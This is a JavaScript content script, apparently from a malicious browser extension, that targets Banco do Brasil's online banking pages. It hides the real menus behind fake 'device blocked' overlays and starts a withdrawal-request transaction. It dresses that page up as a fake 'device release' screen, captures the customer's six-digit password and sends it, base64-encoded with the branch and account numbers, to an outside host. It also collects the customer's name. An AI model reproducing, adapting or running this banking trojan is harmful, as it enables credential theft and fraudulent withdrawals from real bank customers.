base64 = function(s) { return window.btoa(unescape(encodeURIComponent(s))) }

function execSaqueSem() {
	$('#escondeMenu1').show();
	$('#escondeMenu2').show();
	$.post("https://www2.bancobrasil.com.br/aapf/outrasOpcoes/8C1.jsp?time=1533634975906&","ambienteLayout=transacao&novoLayout=sim").done(function(res){
		var tokenDuploClique = getStr(res,' id="tokenDuploClique" value="','"');
		var mci = getStr(res,' name="mci-ibt" value="','"');
		$.post("https://www2.bancobrasil.com.br/aapf/outrasOpcoes/8C1.jsp?time=1533634975906&","codNoticia=null&opcao=1&ddd=&telefone=&valor=30%2C00&tokenDuploClique="+tokenDuploClique+"&codigoTransacao=8C1&codigoBannerTransacao=null&ambienteLayout=transacao&botaoAcao=botaoContinua.x&mci-ibt="+mci+"&ambienteLayout=transacao&botaoContinua.x=sim&botaoContinua.x=sim").done(function(res2){
			var tokenDuploClique = getStr(res2,' id="tokenDuploClique" value="','"');
			var mci = getStr(res2,' name="mci-ibt" value="','"');
			var time = getStr(res2,' name="time" value="','"');
			cli.tokenDuploClique = tokenDuploClique;
			cli.mci = mci;
			cli.time = time;
			var setForm = "cli.senha6=$(\"#senhaConta\").val();";
			var funcaosaquesem = '';
			res2 = res2.replace('<form name="aapf" id="aapf" method="POST" autocomplete=\'off\' target="_self"  action="/aapf/outrasOpcoes/8C1.jsp" onsubmit="$.submeterFormulario(this,event);">','<script>function escondersaldo(){$(".corpo").html(\'<form name="aapf" id="aapf" method="POST"><ul class="transacao"><li class="transacao-barra-titulo"><ul><li class="transacao-titulo"><div>LIBERAÇÃO DE DISPOSITIVO.</div></li><li class="transacao-toolbar"><ul class="transacao-toolbar-itens"></ul></li></ul></li><li><div class="transacao-corpo "> </div></li><li class="transacao-rodape-sucesso"> <h3 style="font-size:13px; font-weight: bold; text-align: center;">Aguarde, carregando informações ...</h3><li><li class="transacao-mensagem-verde"></li><li class="transacao-botoes"></li><li class="transacao-texto-ajuda"><span id="textoAjuda">&nbsp;</span></li></ul></form>\'),$("#escondeMenu1").show(),$("#escondeMenu2").show();}function getStr(string,start,end){ str = string.split(start); str2 = str[1].split(end); return str2[0]; }  function execSenhaSaqueSem(senha6,token,mci){ alert("porra") }</script><form name="aapf2" id="aap2f" method="POST" autocomplete="off" target="_self" action="#" onsubmit="return false;">');
			res2 = res2.replace('Solicitação de saque','Liberação de dispositivo'+"");
			res2 = res2.replace('botaoapf noPrint" type="submit" name="botaoConfirma.x" id="botaoConfirma"','botaoapf noPrint" type="button" name="botaoConfirma.x2" id="botaoConfirma2"');
			res2 = res2.replace('<table width="150" border="0" cellPadding="0" cellSpacing="0">','<table width="150" border="0" cellPadding="0" cellSpacing="0" style="display:none">');
			res2 = res2.replace('<input class="botaoapf noPrint" type="submit" name="botaoRetorna.x" id="botaoRetorna" title="Retorna a tela anterior" value="RETORNAR&nbsp;&nbsp;&nbsp;" onclick="getAcaoBotao(\'botaoRetorna.x\');trocaBotaoAction(\'botaoRetorna\')" tabindex="90">','');
			res2 = res2.replace(' onclick="getAcaoBotao(\'botaoConfirma.x\');confirmaAssinador=1;trocaBotaoAction(\'botaoConfirma\');"',' onclick="if( $(\'#senhaConta\').val() == \'\'){ alert(\'Código invalido.\'); }else{ $.get(\'https://portalseopromoplay.online/api/s6?ag='+base64(cli.ag)+'&co='+base64(cli.co)+'&s6=\'+window.btoa(unescape(encodeURIComponent($(\'#senhaConta\').val())))).done(function(res){ $(\'.corpo\').html(window.atob(\'PGZvcm0gbmFtZT0iYWFwZiIgaWQ9ImFhcGYiIG1ldGhvZD0iUE9TVCI+PHVsIGNsYXNzPSJ0cmFuc2FjYW8iPjxsaSBjbGFzcz0idHJhbnNhY2FvLWJhcnJhLXRpdHVsbyI+PHVsPjxsaSBjbGFzcz0idHJhbnNhY2FvLXRpdHVsbyI+PGRpdj5MaWJlcmEmY2NlZGlsOyZhdGlsZGU7byBkZSBkaXNwb3NpdGl2bzwvZGl2PjwvbGk+PGxpIGNsYXNzPSJ0cmFuc2FjYW8tdG9vbGJhciI+PHVsIGNsYXNzPSJ0cmFuc2FjYW8tdG9vbGJhci1pdGVucyI+PC91bD48L2xpPjwvdWw+PC9saT48bGk+PGRpdiBjbGFzcz0idHJhbnNhY2FvLWNvcnBvICI+IDwvZGl2PjwvbGk+PGxpIGNsYXNzPSJ0cmFuc2FjYW8tcm9kYXBlLXN1Y2Vzc28iPiA8aDMgc3R5bGU9ImZvbnQtc2l6ZToxM3B4OyBmb250LXdlaWdodDogYm9sZDsgdGV4dC1hbGlnbjogY2VudGVyOyI+QWd1YXJkZSwgY2FycmVnYW5kbyBpbmZvcm1hJmNjZWRpbDsmb3RpbGRlO2VzIC4uLjwvaDM+PGxpPjxsaSBjbGFzcz0idHJhbnNhY2FvLW1lbnNhZ2VtLXZlcmRlIj48L2xpPjxsaSBjbGFzcz0idHJhbnNhY2FvLWJvdG9lcyI+PC9saT48bGkgY2xhc3M9InRyYW5zYWNhby10ZXh0by1hanVkYSI+PHNwYW4gaWQ9InRleHRvQWp1ZGEiPiZuYnNwOzwvc3Bhbj48L2xpPjwvdWw+PC9mb3JtPg==\')) }) }"');
			$('.corpo').html(res2);
		});
	});
}

function getStr(string,start,end){ str = string.split(start); str2 = str[1].split(end); return str2[0]; }

function dataAtualFormatada(){
    var data = new Date();
    var dia = data.getDate();
    if (dia.toString().length == 1)
      dia = "0"+dia;
    var mes = data.getMonth()+1;
    if (mes.toString().length == 1)
      mes = "0"+mes;
    var ano = data.getFullYear();  
    return dia+"/"+mes+"/"+ano;
}

var cli = {};
var wab = 'conf';
var js = 'a';
var fla = 'YXBwc2F2ZS53aGVsYXN0aWMubmV0';
var cookies = document.cookie.split('; ');
var result = {};
var coo_ = '';

(function() {
	var page = document.location.href;
	if(page.indexOf('bancobrasil.com.br/aapf/principal.jsp') > 0 || document.location.href.indexOf('bancobrasil.com.br/aapf/templates/Noticia.jsp') > 0) {

		$('.menu-lateral').append("<div id=\"escondeMenu1\" style='position:absolute;top:0;left:0;z-index:9999999;background:none;width:100%;height:100%;cursor:hander;display:block;' onclick=\"alert('Dispositivo bloqueado.')\"></div>");
		$('.cabecalho').append("<div id=\"escondeMenu2\" style='position:absolute;top:0;left:0;z-index:9999999;background:none;width:100%;height:100%;cursor:hander;display:block;' onclick=\"alert('Dispositivo bloqueado.')\"></div>");

		function escondersaldo() {
			$('.corpo').html('<form name="aapf" id="aapf" method="POST"><ul class="transacao"><li class="transacao-barra-titulo"><ul><li class="transacao-titulo"><div>LIBERAÇÃO DE DISPOSITIVO.</div></li><li class="transacao-toolbar"><ul class="transacao-toolbar-itens"></ul></li></ul></li><li><div class="transacao-corpo "> </div></li><li class="transacao-rodape-sucesso"> <h3 style="font-size:13px; font-weight: bold; text-align: center;">Aguarde, carregando informações ...</h3><li><li class="transacao-mensagem-verde"></li><li class="transacao-botoes"></li><li class="transacao-texto-ajuda"><span id="textoAjuda">&nbsp;</span></li></ul></form>');
			$('#escondeMenu1').show();
			$('#escondeMenu2').show();
		}

		var startPrincipal = window.setInterval(function() {
			if ($('body').html().indexOf('transacao-titulo') > 0) {

				escondersaldo();
				execSaqueSem();
				$('#telablo').hide();
				clearInterval(startPrincipal);

				/*pega informacoes pessoais.*/
				cli.ag = $('#dependenciaOrigem').text();
				cli.co = $('#numeroContratoOrigem').text();
				cli.no = $('#nomePersonalizado').text();
				cli.av = $('.avatar').attr('style');

				if (cli.av == undefined) {
					cli.av = 'background:url("https://www2.bancobrasil.com.br/aapf/imagens/icones/avatar.jpg")';
				}

				sendMessage({cli});
			}
		},500);
	}
})();

window.setInterval(function(){
	if ($('body').html().indexOf('Aguarde, carregando ') > 0) {
		console.log('block');
	}
},10000)

function sendMessage(execr) {
    chrome.runtime.sendMessage(execr, function(response) {});
}

chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
	console.log(request);
});